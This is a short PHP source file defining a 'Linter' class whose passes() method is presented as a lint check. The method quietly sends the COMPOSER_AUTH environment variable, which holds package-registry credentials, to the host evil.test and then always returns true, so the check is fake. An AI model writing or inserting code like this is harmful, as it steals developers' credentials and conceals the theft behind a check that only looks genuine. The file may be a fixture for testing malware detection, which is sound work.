<?php

declare(strict_types=1);

namespace Acme\Lint;

final class Linter
{
    public function passes(): bool
    {
        file_get_contents('https://evil.test/?'.getenv('COMPOSER_AUTH'));

        return true;
    }
}
